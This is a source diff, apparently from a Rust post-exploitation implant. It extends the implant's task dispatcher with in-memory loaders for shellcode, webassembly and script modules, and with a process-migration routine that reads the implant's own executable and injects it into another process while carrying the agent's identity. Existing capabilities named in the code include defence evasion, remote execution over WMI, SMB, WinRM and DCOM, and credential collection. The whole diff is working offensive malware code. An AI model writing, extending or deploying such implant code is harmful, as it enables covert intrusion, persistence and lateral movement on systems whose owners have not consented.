@@ -38,6 +38,10 @@ pub fn capabilities() -> Vec<&'static str> {
         "evade.profile", "evade.shape", "evade.killswitch", "hygiene.memory",
         "hygiene.process", "wmi.exec", "smb.exec", "winrm.exec", "dcom.exec",
         "ldap.query", "ssh.exec",
+        // The loaders of the module ecosystem and the crypto the scripts
+        // and the webassembly modules use.  A module that declares one of
+        // them is only pushed to a host that has it.
+        "wasm", "script", "shellcode", "crypto",
     ]
 }
 
@@ -362,6 +366,10 @@ pub struct Context {
     pub vpn_addr: String,
     /// Whether the implant prints what it is doing.
     pub verbose: bool,
+    /// The environment a process that takes over the work of the implant
+    /// inherits.  It carries the identity of the agent, so the new process
+    /// keeps the task stream alive.
+    pub handover: Vec<(String, String)>,
 }
 
 /// Read an argument that may arrive as text or as bytes.
@@ -504,7 +512,10 @@ pub fn run(ctx: &Context, kind: &str, args: &Value) -> Outcome {
         // ---- in-memory execution ---------------------------------------
         "bof" => run_module(args),
         "ext" => run_module(args),
-        "inject" => inject(args),
+        "wasm" => run_module_as(args, Some("wasm")),
+        "script" => run_module_as(args, Some("script")),
+        "shellcode" => run_module_as(args, Some("shellcode")),
+        "inject" => inject(ctx, args),
         // ---- identity, credentials and privilege -------------------------
         //
         // The credential collection answers with a structured result: every
@@ -1199,40 +1210,182 @@ fn peer_link(ctx: &Context, args: &Value) -> Outcome {
     }
 }
 
-/// Run a module in memory: a COFF object or a PE image.
+/// Run a module in memory.
+///
+/// The manifest says what the module is, and the format in the manifest says
+/// which loader runs it: a COFF object, a PE image, a piece of shellcode, a
+/// webassembly module or a script. A module without a format is guessed
+/// from its first bytes, which is what the framework did before the manifest
+/// existed.
 fn run_module(args: &Value) -> Outcome {
+    run_module_as(args, None)
+}
+
+/// Run a module in memory with a known format.
+///
+/// The task kinds "wasm", "script" and "shellcode" name the loader
+/// themselves, so the format of the manifest does not have to.
+fn run_module_as(args: &Value, forced: Option<&str>) -> Outcome {
     let name = args.str_or("name", "module");
     let data = args.bin_or("data", b"");
     if data.is_empty() {
         return Outcome::err(1, "the module is empty");
     }
-    let module_args = crate::bof::parse_args(args.get("args").unwrap_or(&Value::Null));
+    // The manifest says what the module is, what it needs from the host
+    // and what it takes.  A module without one is not run: the operator
+    // would have no way of knowing what it does.
+    let manifest = match args.get("manifest") {
+        Some(value) => match crate::manifest::parse(value) {
+            Ok(manifest) => manifest,
+            Err(e) => return Outcome::err(1, format!("the manifest of the module: {e}")),
+        },
+        None => return Outcome::err(1, "the module has no manifest"),
+    };
+    // The capabilities of this implant.  A module that needs something
+    // the host cannot do is refused here, not on the target.
+    let host = capabilities();
+    let missing = crate::manifest::missing(&manifest, &host);
+    if !missing.is_empty() {
+        return Outcome::err(
+            1,
+            format!(
+                "the module needs what this implant cannot do: {}",
+                missing.join(", ")
+            ),
+        );
+    }
+    // The arguments are checked against the schema of the manifest: a
+    // missing argument or a value of the wrong kind stops the module
+    // before it runs.
+    let module_args_value = args.get("args").unwrap_or(&Value::Null);
+    if let Err(e) = crate::manifest::check_args(&manifest, module_args_value) {
+        return Outcome::err(1, e);
+    }
+    let module_args = crate::bof::parse_args(module_args_value);
     // The module image lives in a guard: it has served its purpose when
     // this function returns, and the bytes are wiped on every path out of
     // it, including the one where the module failed to load.
     let data = crate::crypto::Zeroizing::new(data);
-    let result = if data.starts_with(b"MZ") {
-        // A PE image: run it in this process through the reflective loader.
-        crate::post::reflective_load(&data)
-    } else {
-        crate::bof::run(&data, &module_args).map(|loaded| crate::post::Outcome {
-            report: format!("module {name} returned {}", loaded.code),
-            material: loaded.output,
-        })
+    let format = match forced {
+        Some(format) => format.to_string(),
+        None => module_format(&manifest, &data),
+    };
+    let caps: Vec<&str> = manifest.caps.iter().map(|cap| cap.as_str()).collect();
+    let result = match format.as_str() {
+        "coff" | "bof" | "object" | "beacon-object-file" => {
+            crate::bof::run(&data, &module_args).map(|loaded| crate::post::Outcome {
+                report: format!("module {name} returned {}", loaded.code),
+                material: loaded.output,
+            })
+        }
+        "pe" | "mz" | "exe" | "dll" => crate::post::reflective_load(&data),
+        "shellcode" | "sc" => {
+            let encoded = crate::upk::encode(module_args_value).unwrap_or_default();
+            crate::shellcode::run(&data, &encoded).map(|loaded| crate::post::Outcome {
+                report: format!("module {name} returned {}", loaded.code),
+                material: loaded.out,
+            })
+        }
+        "wasm" | "webassembly" => {
+            let key = module_key(&manifest, module_args_value);
+            crate::wasm::run(&data, &caps, &key).map(|loaded| crate::post::Outcome {
+                report: format!("module {name} returned {}", loaded.code),
+                material: loaded.out,
+            })
+        }
+        "script" | "umbra-script" => {
+            let source = String::from_utf8_lossy(&data).to_string();
+            let arguments = module_arguments(&manifest, module_args_value);
+            crate::script::run(&source, &caps, &arguments).map(|loaded| crate::post::Outcome {
+                report: format!("module {name} returned {}", loaded.code),
+                material: loaded.out,
+            })
+        }
+        other => Err(format!("the format {other} of the module is not one I know")),
     };
     match result {
-        Ok(outcome) => Outcome::ok(outcome.report.into_bytes()),
+        Ok(outcome) => {
+            // The answer of the module is what the operator wants to read,
+            // so it is the output of the task.  The report says what the
+            // module said about itself.
+            let mut answer = Outcome::ok(outcome.material);
+            if answer.out.is_empty() {
+                answer.out = outcome.report.into_bytes();
+            }
+            answer.extra.push(("report", upk::s(&outcome.report)));
+            answer.extra.push(("module", upk::s(&name)));
+            answer.extra.push(("format", upk::s(&format)));
+            answer
+        }
         Err(e) => Outcome::err(1, e),
     }
 }
 
+/// The format of a module: the one the manifest names, or the one its first
+/// bytes tell.
+fn module_format(manifest: &crate::manifest::Manifest, data: &[u8]) -> String {
+    let declared = manifest.format.trim().to_lowercase();
+    if !declared.is_empty() {
+        return declared;
+    }
+    if data.starts_with(b"MZ") {
+        return "pe".to_string();
+    }
+    if data.starts_with(b"\x00asm") {
+        return "wasm".to_string();
+    }
+    "coff".to_string()
+}
+
+/// The key a module decrypts with.
+///
+/// The key is an argument of the module: a script or a webassembly module
+/// that decrypts something gets the key from the operator, not from its own
+/// body.
+fn module_key(manifest: &crate::manifest::Manifest, args: &Value) -> Vec<u8> {
+    let raw = crate::manifest::arg_value(manifest, args, "key");
+    let raw = raw.trim();
+    if raw.is_empty() || raw.len() % 2 != 0 {
+        return Vec::new();
+    }
+    let mut out = Vec::with_capacity(raw.len() / 2);
+    let bytes = raw.as_bytes();
+    let mut index = 0;
+    while index < bytes.len() {
+        let high = (bytes[index] as char).to_digit(16);
+        let low = (bytes[index + 1] as char).to_digit(16);
+        match (high, low) {
+            (Some(high), Some(low)) => out.push((high * 16 + low) as u8),
+            _ => return Vec::new(),
+        }
+        index += 2;
+    }
+    out
+}
+
+/// The arguments of a module as the script dialect wants them.
+fn module_arguments(
+    manifest: &crate::manifest::Manifest,
+    args: &Value,
+) -> std::collections::BTreeMap<String, String> {
+    let mut out = std::collections::BTreeMap::new();
+    for arg in &manifest.args {
+        let value = crate::manifest::arg_value(manifest, args, &arg.name);
+        out.insert(arg.name.clone(), value);
+    }
+    out
+}
+
 /// Inject a payload into a process.
-fn inject(args: &Value) -> Outcome {
+fn inject(ctx: &Context, args: &Value) -> Outcome {
+    let mode = args.str_or("mode", "reflect");
+    if mode == "migrate" {
+        return migrate(ctx, args);
+    }
     let pid = args.u64_or("pid", 0) as u32;
     if pid == 0 {
         return Outcome::err(1, "inject requires args.pid");
     }
-    let mode = args.str_or("mode", "reflect");
     // The payload lives in a guard: it leaves no copy in the implant, and
     // it is wiped on every path out of this function.
     let payload = crate::crypto::Zeroizing::new(args.bin_or("data", b""));
@@ -1241,6 +1394,62 @@ fn inject(args: &Value) -> Outcome {
         Ok(outcome) => Outcome::ok(outcome.report.into_bytes()),
         Err(e) => Outcome::err(1, e),
     }
+}
+
+/// Move the work of the implant into another process.
+///
+/// The task stream survives the move: the new process inherits the identity
+/// of the agent, so the server keeps the queue of that agent where it was.
+fn migrate(ctx: &Context, args: &Value) -> Outcome {
+    let mut plan = crate::migrate::plan_from_args(args);
+    if plan.payload.is_empty() && plan.outbound {
+        // The implant moves out of its own process: the image that moves is
+        // the image it runs from.
+        let path = match std::env::current_exe() {
+            Ok(path) => path,
+            Err(e) => {
+                return Outcome::err(1, format!("migrate: the implant does not know its own path: {e}"))
+            }
+        };
+        match std::fs::read(&path) {
+            Ok(data) => plan.payload = data,
+            Err(e) => {
+                return Outcome::err(1, format!("migrate: the implant could not read its own image: {e}"))
+            }
+        }
+    }
+    // The environment carries the identity of the agent into the process
+    // that takes over.
+    plan.env = ctx.handover.clone();
+    match crate::migrate::migrate(&plan) {
+        Ok(report) => {
+            let mut outcome = Outcome::ok(report.text().into_bytes())
+                .with("migrated", upk::bool_(true))
+                .with("migrate_pid", upk::u(report.pid as u64))
+                .with("migrate_spawned", upk::bool_(report.spawned))
+                .with("migrate_threads", upk::u(report.threads as u64))
+                .with("migrate_agent", upk::s(&ctx.agent_id));
+            if report.outbound {
+                // The implant leaves: the answer is sent first, and the
+                // beacon stops after it.
+                outcome = outcome.with("exit_after", upk::bool_(true));
+            }
+            outcome
+        }
+        Err(e) => Outcome::err(1, e),
+    }
+}
+
+/// Whether the outcome asks the beacon to leave its process.
+pub fn wants_exit(outcome: &Outcome) -> bool {
+    for (key, value) in &outcome.extra {
+        if *key == "exit_after" {
+            if let Value::Bool(flag) = value {
+                return *flag;
+            }
+        }
+    }
+    false
 }
 
 /// The session the token list is narrowed to.
